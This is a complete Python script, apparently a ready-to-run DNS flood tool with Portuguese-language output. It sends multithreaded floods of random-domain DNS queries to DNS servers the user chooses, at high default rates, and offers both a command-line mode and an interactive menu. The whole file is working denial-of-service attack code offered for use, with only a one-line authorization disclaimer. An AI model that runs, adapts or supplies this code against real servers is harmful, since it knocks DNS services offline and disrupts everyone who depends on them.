#!/usr/bin/env python3
# DNS Flood Attack

import argparse
import socket
import random
import struct
import threading
import time
import os
import signal
import sys
from datetime import datetime

# Global flag to handle graceful termination
running = True

def dict_to_xml(tag, d):
    """Converts a dictionary to a simple XML string."""
    parts = [f"<{tag}>"]
    for key, value in d.items():
        if isinstance(value, dict):
            parts.append(dict_to_xml(key, value))
        else:
            parts.append(f"<{key}>{value}</{key}>")
    parts.append(f"</{tag}>")
    return ''.join(parts)

class DNSFlooder:
    def __init__(self, dns_servers, duration, query_rate):
        """Initialize the DNS flooder with the target configuration."""
        self.dns_servers = dns_servers
        self.attack_duration = duration
        self.query_rate = query_rate
        self.threads = 10  # Number of threads for sending DNS queries
        self.running = False
        self.start_time = None
        self.log_dir = "/var/log/network_tests"
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(self.log_dir, f"dns_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
        self.stats = {
            'dns_queries_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }

    def _log_event(self, event_type, message):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'message': message,
            'stats': self.stats.copy()
        }
        try:
            with open(self.log_file, 'a') as f:
                xml_entry = dict_to_xml('log', log_entry)
                f.write(xml_entry + '\n')
        except Exception as e:
            print(f"[LOG ERROR] {str(e)}")

    def generate_random_domain(self):
        """Generates a random domain name for the attack."""
        letters = "abcdefghijklmnopqrstuvwxyz"
        domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
        return domain + ".com"

    def create_dns_query(self, domain):
        """Creates a DNS query packet for a given domain."""
        transaction_id = random.randint(0, 65535)
        flags = struct.pack(">H", 0x0100)  # Standard query with recursion desired
        num_queries = struct.pack(">H", 1)
        num_answers = struct.pack(">H", 0)
        num_authority = struct.pack(">H", 0)
        num_additional = struct.pack(">H", 0)

        # Encode domain name into DNS format
        encoded_domain = b""
        for label in domain.split("."):
            encoded_domain += struct.pack(">B", len(label)) + label.encode()
        encoded_domain += b"\x00"

        query_type = struct.pack(">H", 1)  # A record
        query_class = struct.pack(">H", 1)  # IN class

        return (struct.pack(">H", transaction_id) + flags + num_queries +
                num_answers + num_authority + num_additional +
                encoded_domain + query_type + query_class)

    def send_dns_queries(self):
        """Sends DNS queries to the target DNS servers."""
        end_time = time.time() + self.attack_duration
        while self.running and time.time() < end_time:
            try:
                target_ip = random.choice(self.dns_servers)
                domain = self.generate_random_domain()
                query = self.create_dns_query(domain)

                # Determine if target_ip is IPv6 or IPv4
                is_ipv6 = ":" in target_ip
                sock_type = socket.AF_INET6 if is_ipv6 else socket.AF_INET

                sock = socket.socket(sock_type, socket.SOCK_DGRAM)
                sock.sendto(query, (target_ip, 53))
                sock.close()

                self.stats['dns_queries_sent'] += 1
                time.sleep(1 / self.query_rate)
            except Exception as e:
                self.stats['errors'] += 1
                self._log_event('DNS_ERROR', str(e))
                time.sleep(0.001)

    def dns_flood(self):
        """Start the DNS flood attack using multiple threads."""
        self._log_event('DNS_START', 'Iniciando ataque de DNS flood')
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send_dns_queries)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def start(self):
        """Starts the attack."""
        self.running = True
        self.stats['start_time'] = datetime.now().isoformat()
        self.start_time = time.time()

        print(f"\n🔧 Configuração do Ataque:")
        print(f"   • DNS Servers: {', '.join(self.dns_servers)}")
        print(f"   • Duração: {self.attack_duration}s")
        print(f"   • Query Rate: {self.query_rate} qps por thread")
        print(f"   • Log File: {self.log_file}\n")

        try:
            self.dns_flood()
        except KeyboardInterrupt:
            print("\n🛑 Interrompido pelo usuário!")

        self.stop()

    def stop(self):
        """Stop the attack."""
        self.running = False
        self.stats['end_time'] = datetime.now().isoformat()
        self._log_event('TEST_END', 'Ataque de DNS flood concluído')

        duration = time.time() - self.start_time
        print("\n\n📊 Relatório Final:")
        print(f"   • Duração real: {duration:.1f}s")
        print(f"   • DNS Queries enviadas: {self.stats['dns_queries_sent']}")
        print(f"   • Erros registrados: {self.stats['errors']}")
        print(f"   • Log completo em: {self.log_file}\n")

def signal_handler(sig, frame):
    """Graceful exit handler."""
    global running
    print("\n🛑 Recebido sinal de interrupção!")
    running = False
    sys.exit(0)

def menu():
    """Interactive menu mode."""
    print("\n⚠️ AVISO LEGAL: Use este script apenas em redes próprias ou com autorização explícita!\n")
    dns_servers = input("Digite os endereços IP dos servidores DNS (separados por vírgula): ").split(",")
    duration = int(input("Digite a duração do ataque em segundos: "))
    query_rate = int(input("Digite a taxa de consultas por segundo por thread: "))

    # Create and start the DNS flooder
    flooder = DNSFlooder(dns_servers, duration, query_rate)
    flooder.start()

def terminal():
    """Terminal mode using arguments."""
    parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
    parser.add_argument("-d", "--dns", type=str, required=True, help="Comma-separated list of DNS server IP addresses.")
    parser.add_argument("-t", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
    parser.add_argument("-q", "--query_rate", type=int, default=2500, help="Queries per second per thread (default: 2500).")

    args = parser.parse_args()

    dns_servers = args.dns.split(",")
    duration = args.duration
    query_rate = args.query_rate

    flooder = DNSFlooder(dns_servers, duration, query_rate)
    flooder.start()

def main():
    """Main function to handle both interactive and terminal modes."""
    signal.signal(signal.SIGINT, signal_handler)

    if len(sys.argv) > 1:
        terminal()  # Terminal mode
    else:
        menu()  # Interactive menu mode

if __name__ == "__main__":
    main()
